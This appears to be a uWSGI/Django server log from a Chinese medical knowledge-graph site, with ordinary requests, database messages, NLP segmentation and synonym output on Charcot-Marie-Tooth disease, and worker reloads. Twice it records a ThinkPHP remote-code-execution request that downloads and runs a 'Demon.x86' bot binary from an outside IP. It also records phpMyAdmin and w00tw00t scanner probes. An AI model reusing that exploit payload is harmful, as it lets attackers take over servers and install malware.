
[pid: 6839|app: 0|req: 13/13] 185.83.181.66 () {38 vars in 598 bytes} [Sun Apr 21 16:12:55 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
[pid: 6839|app: 0|req: 14/14] 185.83.181.66 () {38 vars in 599 bytes} [Sun Apr 21 16:12:57 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
[pid: 6839|app: 0|req: 15/15] 185.83.181.66 () {38 vars in 598 bytes} [Sun Apr 21 16:13:02 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
[pid: 6839|app: 0|req: 16/16] 41.60.233.79 () {32 vars in 452 bytes} [Sun Apr 21 17:01:27 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
[pid: 6839|app: 0|req: 17/17] 154.48.227.35 () {40 vars in 632 bytes} [Sun Apr 21 17:19:22 2019] GET /upload/bank-icons/bank-gh.jpg => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
[pid: 6839|app: 0|req: 18/18] 154.48.227.35 () {40 vars in 632 bytes} [Sun Apr 21 17:19:22 2019] GET /upload/bank-icons/bank_16.png => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
[pid: 6839|app: 0|req: 19/19] 185.198.0.168 () {32 vars in 452 bytes} [Sun Apr 21 18:13:39 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
[pid: 6839|app: 0|req: 20/20] 185.244.25.224 () {36 vars in 1005 bytes} [Sun Apr 21 18:24:22 2019] GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://185.244.25.145/Demon.x86%20;chmod%20777%20*%20Demon.x86;%20cat%20Demon.x86%20%3E%20efjins;chmod%20777%20efjins;./efjins%20thinkphp => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
[pid: 6839|app: 0|req: 21/21] 138.204.133.8 () {32 vars in 452 bytes} [Sun Apr 21 18:57:39 2019] GET / => generated 12678 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
[pid: 6839|app: 0|req: 22/22] 103.23.237.255 () {32 vars in 460 bytes} [Sun Apr 21 19:00:21 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
[pid: 6839|app: 0|req: 23/23] 124.248.177.47 () {32 vars in 453 bytes} [Sun Apr 21 19:02:29 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
[pid: 6839|app: 0|req: 24/24] 196.2.14.184 () {32 vars in 451 bytes} [Sun Apr 21 19:03:48 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
[pid: 6839|app: 0|req: 25/25] 178.73.215.171 () {28 vars in 288 bytes} [Sun Apr 21 20:10:39 2019] GET / => generated 1127 bytes in 80 msecs (HTTP/1.0 400) 1 headers in 68 bytes (1 switches on core 0)
[pid: 6839|app: 0|req: 26/26] 185.244.25.224 () {36 vars in 1005 bytes} [Sun Apr 21 21:12:57 2019] GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://185.244.25.145/Demon.x86%20;chmod%20777%20*%20Demon.x86;%20cat%20Demon.x86%20%3E%20efjins;chmod%20777%20efjins;./efjins%20thinkphp => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
[pid: 6839|app: 0|req: 27/27] 81.163.48.131 () {32 vars in 452 bytes} [Sun Apr 21 21:49:11 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
[pid: 6839|app: 0|req: 28/28] 80.82.70.187 () {32 vars in 421 bytes} [Sun Apr 21 22:48:10 2019] GET /cache/global/img/gs.gif => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
[pid: 6839|app: 0|req: 29/29] 91.140.113.123 () {32 vars in 453 bytes} [Sun Apr 21 22:56:56 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
[pid: 6839|app: 0|req: 30/30] 142.93.9.47 () {38 vars in 507 bytes} [Mon Apr 22 01:43:15 2019] GET /w00tw00t.at.blackhats.romanian.anti-sec:) => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
数据库已存在！
create neo4j class ...
connect succeed
数据库已存在！
[pid: 6837|app: 0|req: 1/31] 142.93.9.47 () {38 vars in 481 bytes} [Mon Apr 22 01:43:16 2019] GET /phpMyAdmin/scripts/setup.php => generated 1121 bytes in 4127 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
[pid: 6839|app: 0|req: 31/32] 142.93.9.47 () {38 vars in 481 bytes} [Mon Apr 22 01:43:20 2019] GET /phpmyadmin/scripts/setup.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
[pid: 6837|app: 0|req: 2/33] 142.93.9.47 () {38 vars in 467 bytes} [Mon Apr 22 01:43:21 2019] GET /pma/scripts/setup.php => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
[pid: 6839|app: 0|req: 32/34] 142.93.9.47 () {38 vars in 471 bytes} [Mon Apr 22 01:43:21 2019] GET /phpmy/scripts/setup.php => generated 1121 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
[pid: 6839|app: 0|req: 33/35] 59.36.119.226 () {38 vars in 659 bytes} [Mon Apr 22 04:58:28 2019] GET /phpmy/scripts/setup.php => generated 1121 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
[pid: 6839|app: 0|req: 34/36] 124.160.57.70 () {44 vars in 836 bytes} [Mon Apr 22 05:06:30 2019] GET / => generated 12678 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
[pid: 6839|app: 0|req: 35/37] 124.160.57.70 () {44 vars in 876 bytes} [Mon Apr 22 05:06:31 2019] GET /views/console => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 120 bytes (1 switches on core 1)
259====1
{'title': '改变“重口味”饮食习惯 远离疾病', 'abstract': '当今的饮食一般都是“重口味”的食物，如汉堡、烧烤、火锅等。这些日常的“重口味”饮食的危害你不得不知道。那如何改变“重口味”的饮食习惯呢？', 'url': 'https://ys.99.com.cn/zhinan/572453.htm'}
[pid: 6837|app: 0|req: 3/38] 124.160.57.70 () {44 vars in 878 bytes} [Mon Apr 22 05:06:31 2019] GET /views/console/ => generated 13483 bytes in 1191 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
[pid: 6839|app: 0|req: 36/39] 124.160.57.70 () {44 vars in 878 bytes} [Mon Apr 22 05:06:52 2019] GET /views/consoles => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 121 bytes (1 switches on core 1)
数据库已存在！
create neo4j class ...
connect succeed
数据库已存在！
[pid: 6838|app: 0|req: 1/40] 124.160.57.70 () {44 vars in 880 bytes} [Mon Apr 22 05:06:52 2019] GET /views/consoles/ => generated 8292 bytes in 3731 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
[pid: 6839|app: 0|req: 37/41] 124.160.57.70 () {44 vars in 884 bytes} [Mon Apr 22 05:07:16 2019] GET /views/distinguish => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 124 bytes (1 switches on core 1)
[pid: 6839|app: 0|req: 38/42] 124.160.57.70 () {44 vars in 886 bytes} [Mon Apr 22 05:07:16 2019] GET /views/distinguish/ => generated 4075 bytes in 1 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 1)
/usr/local/lib/python3.7/site-packages/paramiko/kex_ecdh_nist.py:39: CryptographyDeprecationWarning: encode_point has been deprecated on EllipticCurvePublicNumbers and will be removed in a future version. Please use EllipticCurvePublicKey.public_bytes to obtain both compressed and uncompressed point encoding.
  m.add_string(self.Q_C.public_numbers().encode_point())
/usr/local/lib/python3.7/site-packages/paramiko/kex_ecdh_nist.py:96: CryptographyDeprecationWarning: Support for unsafe construction of public numbers from encoded data will be removed in a future version. Please use EllipticCurvePublicKey.from_encoded_point
  self.curve, Q_S_bytes
/usr/local/lib/python3.7/site-packages/paramiko/kex_ecdh_nist.py:111: CryptographyDeprecationWarning: encode_point has been deprecated on EllipticCurvePublicNumbers and will be removed in a future version. Please use EllipticCurvePublicKey.public_bytes to obtain both compressed and uncompressed point encoding.
  hm.add_string(self.Q_C.public_numbers().encode_point())
------start------
[connect success] | ip : 39.108.111.94
result:
Model loaded succeed [['腓骨肌萎缩症', 'uw'], ['(', 'w'], ['peronialmyoatrophy', 'x'], [')', 'w'], ['又', 'd'], ['称', 'v'], ['Charcot', 'x'], ['-', 'w'], ['Marie', 'x'], ['-', 'w'], ['Tooth', 'x'], ['病', 'n'], ['(', 'w'], ['CMT', 'x'], [')', 'w'], ['、', 'w'], ['遗传性', 'n'], ['运动感', 'n'], ['觉', 'v'], ['神经病', 'n'], ['(', 'w'], ['hereditarymotorandsensoryneuropathy', 'x'], ['，', 'w'], ['HMSN', 'x'], [')', 'w'], ['，', 'w'], ['是', 'v'], ['一', 'm'], ['组', 'q'], ['最', 'd'], ['常见', 'a'], ['的', 'u'], ['家族', 'n'], ['遗传性', 'n'], ['周围', 'f'], ['神经病', 'n'], ['，', 'w'], ['约', 'd'], ['占', 'v'], ['全部', 'm'], ['遗传性', 'n'], ['神经病', 'n'], ['的', 'u'], ['9', 'm'], ['0', 'q'], ['%', 'w'], ['，', 'w'], ['患病率', 'n'], ['为', 'v'], ['1', 'm'], ['/', 'w'], ['2500', 'm'], ['，', 'w'], ['无', 'v'], ['种族', 'n'], ['差异', 'n'], ['。', 'w'], ['本组', 'r'], ['疾病', 'n'], ['的', 'u'], ['共同', 'a'], ['特点', 'n'], ['为', 'v'], ['儿童', 'n'], ['或', 'c'], ['青少年', 'n'], ['发病', 'v'], ['，', 'w'], ['慢性', 'a'], ['进行性', 'a'], ['腓骨肌', 'n'], ['萎缩', 'v'], ['、', 'w'], ['无力', 'v'], ['，', 'w'], ['感觉障碍', 'uw'], ['，', 'w'], ['腱', 'v'], ['反射', 'v'], ['减低', 'v'], ['或', 'c'], ['消失', 'v'], ['，', 'w'], ['症状', 'n'], ['和', 'c'], ['体征', 'n'], ['比较', 'd'], ['对称', 'a'], ['，', 'w'], ['多数', 'm'], ['患者', 'n'], ['有', 'v'], ['家', 'n'], ['族', 'g'], ['史', 'g'], ['，', 'w'], ['由于', 'p'], ['以', 'p'], ['腓骨肌', 'n'], ['萎缩', 'v'], ['为', 'v'], ['主要', 'a'], ['临床', 'v'], ['特征', 'n'], ['，', 'w'], ['故', 'c'], ['又', 'd'], ['称', 'v'], ['腓骨肌萎缩症', 'uw'], ['(', 'w'], ['peronealmyoatrophy', 'x'], [')', 'w'], ['。', 'w'], ['根据', 'p'], ['神经', 'n'], ['电', 'n'], ['生理', 'n'], ['，', 'w'], ['神经', 'n'], ['病理', 'n'], ['所', 'u'], ['见', 'v'], ['，', 'w'], ['将', 'p'], ['CMT', 'x'], ['分为', 'v'], ['Ⅰ型', 'n'], ['及', 'c'], ['Ⅱ型', 'n'], ['，', 'w'], ['CMT', 'x'], ['Ⅰ型', 'n'], ['称脱', 'v'], ['髓鞘型', 'a'], ['，', 'w'], ['CMT', 'x'], ['Ⅱ型', 'n'], ['称', 'v'], ['轴索型', 'n'], ['(', 'w'], ['neuronaltype', 'x'], [')', 'w'], ['。', 'w']]

------end------
------start------
[connect success] | ip : 39.108.111.94
result:
smart_open library not found; falling back to local-filesystem-only >> Synonyms load wordseg dict [/usr/local/lib/python3.5/site-packages/synonyms/data/vocab.txt] ... >> Synonyms on loading stopwords [/usr/local/lib/python3.5/site-packages/synonyms/data/stopwords.txt] ... >> Synonyms on loading vectors [/usr/local/lib/python3.5/site-packages/synonyms/data/words.vector] ... {'家': [], '组': ['组', '两组', '小组', '分组', '四组', '第一组', '三组', '一组', '组成员', '第三组'], '将': [], '0': [], '无': [], '以': [], '称': ['称', '称之为', '引述', '援引', '所称', '指', '称作', '并称', '指为', '说是'], '髓鞘型': [], '9': [], '族': ['族', '部落', '部族', '族人', '氏族', '族系', '的族', '一族', '人和', '克族'], '反射': ['反射', '光线', '折射', '反射光', '照射', '散射', '入射', '太阳光', '透射', '叠加'], '、': [], '腱': ['腱', '胫骨', '脚踝', '肌腱', '小腿', '膝盖', '腿部', '肋骨', '脚部', '膝部'], 'Charcot': [], '减低': ['减低', '降低', '减少', '减轻', '增加', '大大降低', '减缓', '尽量减少', '大幅提高', '大大减少'], '发病': ['发病', '发作', '患病', '复发', '胃癌', '确诊', '病症', '肺癌', '中风', '得病'], '所': [], '主要': [], '运动感': [], '史': ['史', '巨著', '通史', '历史学者', '日本史', '简史', '文化史', '世界史', '近代史', '两书'], '轴索型': [], '为': [], '感觉障碍': [], '常见': ['常见', '少见', '常用', '罕见', '常见于', '相似', '类似', '典型', '类似于', '少用'], '腓骨肌萎缩症': [], '遗传性': ['遗传性', '遗传病', '遗传疾病', '肾病', '病症', '病变', '性疾病', '内分泌', '帕金森氏症', '增生'], 'neuronaltype': [], '青少年': ['青少年', '儿童', '青年人', '成年人', '孩童', '成人', '年轻人', '少年儿童', '中学生', '年青人'], '比较': ['比较', '较为', '非常', '相当', '更为', '相对', '来得', '相比较', '比起', '尤其'], '神经': ['神经', '神经系统', '大脑', '脊髓', '神经元', '脑', '脑部', '神经细胞', '中枢神经系统', '骨骼肌'], '电': ['电', '浆', '磁', '电气', '电机', '铁', '磁力', '急电', '高压电', '和光'], 'Ⅰ型': [], '特点': ['特点', '特征', '特色', '优点', '不同之处', '特性', '在结构上', '结构上', '表现形式', '基本特征'], '患者': ['患者', '病人', '病患', '症状', '病症', '患儿', '病患者', '病征', '病变', '高血压'], '患病率': ['患病率', '发病率', '发生率', '死亡率', '感染率', '存活率', '出生率', '肥胖率', '比率', '丙型肝炎'], '神经病': ['神经病', '发疯', '白痴', '精神分裂', '偏执', '老是', '自嘲', '打趣', '所谓', '了无'], '差异': ['差异', '差别', '差异性', '区别', '相异', '不同', '关联性', '歧异', '关联', '相似之处'], 'Ⅱ型': [], '本组': [], '无力': ['无力', '不得不', '不了', '不得已', '急于', '无暇', '勉强', '只得', '根本无法', '无能为力'], 'peronealmyoatrophy': [], '是': [], '见': ['见', '闻', '不见', '不知', '听闻', '方知', '只见', '却说', '可知', '唯'], '2500': [], 'Tooth': [], '消失': ['消失', '消亡', '消退', '变成', '遗忘', '绝迹', '消逝', '变为', '销声匿迹', '不复存在'], '慢性': [], '体征': ['体征', '病症', '病因', '征状', '征象', '病状', '临床表现', '恶性肿瘤', '哮喘', '先兆'], '又': [], '多数': ['多数', '大多', '大部分', '大部份', '基本上', '相当多', '极少', '以外', '一般来说', '同样'], '称脱': [], '由于': [], '(': [], '共同': ['共同', '联合', '合作', '协力', '协同', '携手', '共同完成', '主导', '一同', '都由'], '占': ['占', '占到', '占有', '分之一', '%', '占总', '分之二', '占多数', '占去', '九成'], 'Marie': ['Marie', 'Maria', 'Jean', 'Catherine', 'Anne', 'Anna', 'Louise', 'Vincent', 'Helena', 'Ren'], '分为': ['分为', '分成', '分作', '细分', '分别为', '划分', '包含', '统称', '总称', '可分'], '家族': ['家族', '大家族', '后裔', '后代', '家系', '远亲', '堂兄弟', '的王室', '表亲', '三兄弟'], '%': ['%', '%-', '分之一', '比率', '分之二', '半数', '百分比', '九成', '%~', '据估计'], '故': [], 'peronialmyoatrophy': [], '生理': ['生理', '内分泌', '病理', '心理', '荷尔蒙', '生物体', '认知', '环境因素', '生理反应', '表征'], '症状': ['症状', '病症', '病征', '征状', '患者', '副作用', '疼痛', '腹泻', '呕吐', '病因'], '儿童': ['儿童', '孩童', '青少年', '成年人', '幼儿', '成人', '老年人', '学龄前', '婴幼儿', '学童'], '一': [], '对称': ['对称', '平面', '轴对称', '等距', '梯形', '椭圆', '对角', '菱形', '圆锥', '非对称'], '萎缩': ['萎缩', '衰退', '流失', '锐减', '走下坡', '变小', '消退', '停滞', '快速增长', '剧减'], 'CMT': [], '1': [], '根据': [], '的': [], ')': [], '全部': [], '有': [], '/': [], '临床': ['临床', '临床研究', '医学', '诊断', '病理', '流行病学', '药理学', '针灸', '诊疗', '外科'], '及': [], '进行性': ['进行性', '性虐待', '性功能', '癫痫', '神经性', '外阴', '受虐', '变性', '受累', '短暂性'], '种族': ['种族', '人种', '族裔', '白人', '群体', '族群', '种族主义', '宗教信仰', '有色人种', '白种人'], 'hereditarymotorandsensoryneuropathy': [], '周围': ['周围', '周边', '四周', '外围', '附近', '区域内', '周遭', '远处', '外面', '一处'], '，': [], '觉': ['觉', '慧', '寂', '识', '戒', '蕴', '思', '菩提', '善', '智'], '和': [], '-': ['-', '干', '安', '--', '先于', '在在', '时是', '<tr>', 'Pardosa', '</s>'], 'HMSN': [], '病理': ['病理', '病理学', '临床', '生理', '解剖', '组织学', '病变', '病症', '病因', '流行病学'], '腓骨肌': [], '疾病': ['疾病', '病症', '传染病', '性疾病', '病因', '癌症', '营养不良', '哮喘', '疟疾', '结核病'], '约': ['约', '大约', '左右', '近', '达', '分之一', '有约', '平均', '将近', '共约'], '病': ['病', '患', '疾', '伤寒', '患病', '眼疾', '染病', '得病', '病症', '小儿'], '。': [], '特征': ['特征', '特点', '形态', '特性', '构造', '外观上', '特质', '相似性', '基本特征', '不同之处'], '或': [], '最': [], '===': []}

------end------
腓骨肌萎缩症---腓骨肌萎缩症
peronialmyoatrophy---peronialmyoatrophy
又---又
称---称
Charcot---Charcot
Marie---Marie
Tooth---Tooth
病---病
CMT---CMT
遗传性---遗传性
运动感---运动感
觉---觉
神经病---神经病
hereditarymotorandsensoryneuropathy---hereditarymotorandsensoryneuropathy
HMSN---HMSN
是---是
一---一
组---组
最---最
常见---常见
的---的
家族---家族
遗传性---遗传性
周围---周围
神经病---神经病
约---约
占---占
全部---全部
遗传性---遗传性
神经病---神经病
的---的
9---9
0---0
患病率---患病率
为---为
1---1
2500---2500
无---无
种族---种族
差异---差异
。---。
本组---本组
疾病---疾病
的---的
共同---共同
特点---特点
为---为
儿童---儿童
或---或
青少年---青少年
发病---发病
慢性---慢性
进行性---进行性
腓骨肌---腓骨肌
萎缩---萎缩
无力---无力
感觉障碍---感觉障碍
腱---腱
反射---反射
减低---减低
或---或
消失---消失
症状---症状
和---和
体征---体征
比较---比较
对称---对称
多数---多数
患者---患者
有---有
家---家
族---族
史---史
由于---由于
以---以
腓骨肌---腓骨肌
萎缩---萎缩
为---为
主要---主要
临床---临床
特征---特征
故---故
又---又
称---称
腓骨肌萎缩症---腓骨肌萎缩症
peronealmyoatrophy---peronealmyoatrophy
。---。
根据---根据
神经---神经
电---电
生理---生理
神经---神经
病理---病理
所---所
见---见
将---将
CMT---CMT
分为---分为
Ⅰ型---Ⅰ型
及---及
Ⅱ型---Ⅱ型
CMT---CMT
Ⅰ型---Ⅰ型
称脱---称脱
髓鞘型---髓鞘型
CMT---CMT
Ⅱ型---Ⅱ型
称---称
轴索型---轴索型
neuronaltype---neuronaltype
。---。
[pid: 6838|app: 0|req: 2/43] 124.160.57.70 () {52 vars in 1100 bytes} [Mon Apr 22 05:07:19 2019] POST /views/distinguish/getDistinguishData/ => generated 4313 bytes in 25862 msecs (HTTP/1.1 200) 3 headers in 116 bytes (1 switches on core 1)
[pid: 6837|app: 0|req: 4/44] 124.160.57.70 () {44 vars in 888 bytes} [Mon Apr 22 05:08:05 2019] GET /views/interlocution => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 126 bytes (1 switches on core 1)
[pid: 6838|app: 0|req: 3/45] 124.160.57.70 () {44 vars in 890 bytes} [Mon Apr 22 05:08:05 2019] GET /views/interlocution/ => generated 4095 bytes in 19 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
[pid: 6838|app: 0|req: 4/46] 101.251.242.238 () {38 vars in 586 bytes} [Mon Apr 22 05:31:15 2019] GET / => generated 12678 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
[pid: 6837|app: 0|req: 5/47] 124.160.57.70 () {44 vars in 878 bytes} [Mon Apr 22 05:31:37 2019] GET /accounts/login => generated 0 bytes in 2 msecs (HTTP/1.1 301) 3 headers in 121 bytes (1 switches on core 1)
[pid: 6838|app: 0|req: 5/48] 124.160.57.70 () {44 vars in 880 bytes} [Mon Apr 22 05:31:37 2019] GET /accounts/login/ => generated 5358 bytes in 243 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 0)
[pid: 6838|app: 0|req: 6/49] 124.160.57.70 () {42 vars in 773 bytes} [Mon Apr 22 05:31:43 2019] GET /favicon.ico => generated 1121 bytes in 71 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 1)
Mon Apr 22 05:31:44 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
...gracefully killing workers...
Gracefully killing worker 1 (pid: 6836)...
Gracefully killing worker 2 (pid: 6837)...
Gracefully killing worker 3 (pid: 6838)...
Gracefully killing worker 4 (pid: 6839)...
[pid: 6839|app: 0|req: 39/50] 124.160.57.70 () {52 vars in 1149 bytes} [Mon Apr 22 05:31:44 2019] POST /accounts/login/ => generated 0 bytes in 399 msecs (HTTP/1.1 302) 8 headers in 513 bytes (1 switches on core 0)
worker 1 buried after 1 seconds
worker 2 buried after 1 seconds
worker 4 buried after 1 seconds
worker 3 buried after 2 seconds
binary reloading uWSGI...
chdir() to /root/MHKG/Django
closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
found fd 3 mapped to socket 0 (127.0.0.1:8000)
running /usr/local/bin/uwsgi
[uWSGI] getting INI configuration from uwsgi.ini
*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 05:31:46 2019] ***
compiled with version: 8.3.0 on 16 March 2019 06:35:56
os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
nodename: VM_0_13_centos
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /root/MHKG/Django
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /root/MHKG/Django
your processes number limit is 7272
your memory page size is 4096 bytes
detected max file descriptor number: 100001
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
Python main interpreter initialized at 0x1b931c0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416880 bytes (407 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 6 seconds on interpreter 0x1b931c0 pid: 19822 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
gracefully (RE)spawned uWSGI master process (pid: 19822)
spawned uWSGI worker 1 (pid: 11270, cores: 2)
spawned uWSGI worker 2 (pid: 11271, cores: 2)
spawned uWSGI worker 3 (pid: 11272, cores: 2)
spawned uWSGI worker 4 (pid: 11273, cores: 2)
Python auto-reloader enabled
数据库已存在！
create neo4j class ...
connect succeed
数据库已存在！
[pid: 11271|app: 0|req: 1/1] 124.160.57.70 () {46 vars in 985 bytes} [Mon Apr 22 05:31:53 2019] GET / => generated 12997 bytes in 1646 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
33====6
{'title': '哎呀，走丢了', 'abstract': '', 'url': 'javascript:void(0);'}
[pid: 11271|app: 0|req: 2/2] 124.160.57.70 () {44 vars in 967 bytes} [Mon Apr 22 05:31:54 2019] GET /views/console/ => generated 13579 bytes in 671 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
数据库已存在！
create neo4j class ...
connect succeed
数据库已存在！
[pid: 11272|app: 0|req: 1/3] 124.160.57.70 () {44 vars in 976 bytes} [Mon Apr 22 05:31:59 2019] GET /views/myDoctor?id=1 => generated 0 bytes in 790 msecs (HTTP/1.1 301) 3 headers in 126 bytes (1 switches on core 0)
集合已存在！
集合已存在！
[pid: 11272|app: 0|req: 2/4] 124.160.57.70 () {44 vars in 978 bytes} [Mon Apr 22 05:32:00 2019] GET /views/myDoctor/?id=1 => generated 21459 bytes in 316 msecs (HTTP/1.1 200) 5 headers in 293 bytes (1 switches on core 1)
[pid: 11272|app: 0|req: 3/5] 124.160.57.70 () {44 vars in 1050 bytes} [Mon Apr 22 05:32:04 2019] GET /doctor/getDoctorAndPingjia?doctorId=YS19032701 => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 153 bytes (1 switches on core 0)
集合已存在！
集合已存在！
[pid: 11272|app: 0|req: 4/6] 124.160.57.70 () {44 vars in 1052 bytes} [Mon Apr 22 05:32:04 2019] GET /doctor/getDoctorAndPingjia/?doctorId=YS19032701 => generated 6903 bytes in 33 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 1)
[pid: 11272|app: 0|req: 5/7] 124.160.57.70 () {44 vars in 1036 bytes} [Mon Apr 22 05:32:08 2019] GET /doctor/getQiuzhu?qiuzhuId=qz19041700000 => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 146 bytes (1 switches on core 0)
集合已存在！
集合已存在！
集合已存在！
集合已存在！
[pid: 11271|app: 0|req: 3/8] 124.160.57.70 () {44 vars in 1038 bytes} [Mon Apr 22 05:32:08 2019] GET /doctor/getQiuzhu/?qiuzhuId=qz19041700000 => generated 4008 bytes in 67 msecs (HTTP/1.1 200) 4 headers in 124 bytes (1 switches on core 0)
[pid: 11271|app: 0|req: 4/9] 124.160.57.70 () {44 vars in 1048 bytes} [Mon Apr 22 05:32:17 2019] GET /views/myDoctor/pingjia?qiuzhuId=qz19041700000 => generated 0 bytes in 2 msecs (HTTP/1.1 301) 3 headers in 152 bytes (1 switches on core 1)
集合已存在！
集合已存在！
集合已存在！
集合已存在！
集合已存在！
[pid: 11272|app: 0|req: 6/10] 124.160.57.70 () {44 vars in 1050 bytes} [Mon Apr 22 05:32:17 2019] GET /views/myDoctor/pingjia/?qiuzhuId=qz19041700000 => generated 4263 bytes in 46 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 0)
[pid: 11272|app: 0|req: 7/11] 124.160.57.70 () {44 vars in 986 bytes} [Mon Apr 22 05:57:37 2019] GET /views/interlocution?id=1 => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 131 bytes (1 switches on core 1)
[pid: 11271|app: 0|req: 5/12] 124.160.57.70 () {44 vars in 988 bytes} [Mon Apr 22 05:57:37 2019] GET /views/interlocution/?id=1 => generated 4082 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
[pid: 11271|app: 0|req: 6/13] 124.160.57.70 () {44 vars in 969 bytes} [Mon Apr 22 05:57:43 2019] GET /accounts/logout => generated 0 bytes in 2 msecs (HTTP/1.1 301) 3 headers in 122 bytes (1 switches on core 1)
数据库已存在！
create neo4j class ...
connect succeed
数据库已存在！
[pid: 11273|app: 0|req: 1/14] 124.160.57.70 () {44 vars in 971 bytes} [Mon Apr 22 05:57:43 2019] GET /accounts/logout/ => generated 0 bytes in 845 msecs (HTTP/1.1 302) 5 headers in 223 bytes (1 switches on core 0)
[pid: 11272|app: 0|req: 8/15] 124.160.57.70 () {44 vars in 925 bytes} [Mon Apr 22 05:57:44 2019] GET /accounts/login/ => generated 5358 bytes in 10 msecs (HTTP/1.1 200) 5 headers in 292 bytes (1 switches on core 0)
Mon Apr 22 05:57:44 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
...gracefully killing workers...
Gracefully killing worker 1 (pid: 11270)...
Gracefully killing worker 2 (pid: 11271)...
Gracefully killing worker 4 (pid: 11273)...
Gracefully killing worker 3 (pid: 11272)...
worker 1 buried after 1 seconds
worker 2 buried after 2 seconds
worker 3 buried after 2 seconds
worker 4 buried after 2 seconds
binary reloading uWSGI...
chdir() to /root/MHKG/Django
closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
found fd 3 mapped to socket 0 (127.0.0.1:8000)
running /usr/local/bin/uwsgi
[uWSGI] getting INI configuration from uwsgi.ini
*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 05:57:46 2019] ***
compiled with version: 8.3.0 on 16 March 2019 06:35:56
os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
nodename: VM_0_13_centos
machine: x86_64
clock source: unix
pcre jit disabled
